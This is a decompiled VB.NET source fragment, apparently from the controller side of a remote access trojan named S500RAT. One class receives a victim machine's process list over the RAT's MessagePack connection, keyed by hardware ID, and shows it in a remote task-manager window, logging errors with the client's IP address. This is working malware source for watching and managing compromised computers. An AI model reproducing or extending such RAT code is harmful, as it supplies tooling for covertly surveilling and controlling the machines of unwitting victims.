Imports System
Imports System.Drawing
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000060 RID: 96
	Public Class FrmTaskManager
		' Token: 0x060011BE RID: 4542 RVA: 0x0009E0C0 File Offset: 0x0009C2C0
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formTaskManager As FormTaskManager = CType(Application.OpenForms("FormTaskManager" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormTaskManager)
				Dim flag As Boolean = formTaskManager IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formTaskManager.Client Is Nothing
					If flag2 Then
						formTaskManager.Client = client
						formTaskManager.Timer1.Enabled = True
					End If
					formTaskManager.ListProcess.Enabled = True
					formTaskManager.ListProcess.Rows.Clear()
					Dim asString As String = unpack_msgpack.ForcePathObject("Message").AsString
					Dim array As String() = asString.Split(New String() { "-=>" }, StringSplitOptions.None)
					Dim num As Integer = array.Length - 1
					For i As Integer = 0 To num
						Dim flag3 As Boolean = array(i).Length > 0
						If flag3 Then
							Dim text As String = array(i)
							Dim fileName As String = Path.GetFileName(text)
							Dim text2 As String = array(i + 1)
							Dim image As Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(array(i + 2))))
							Dim flag4 As Boolean = formTaskManager.Client IsNot Nothing
							If Not flag4 Then
								Exit For
							End If
							formTaskManager.ListProcess.Rows.Add(New Object() { image, fileName, text2, text })
						End If
						i += 2
					Next
					formTaskManager.ProcessNum.Text = "Processes [ " + Conversions.ToString(Conversions.ToInteger(formTaskManager.ListProcess.Rows.Count)) + " ]"
				End If
			Catch ex As Exception
				ListLogs.AddArray("Task Manager " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
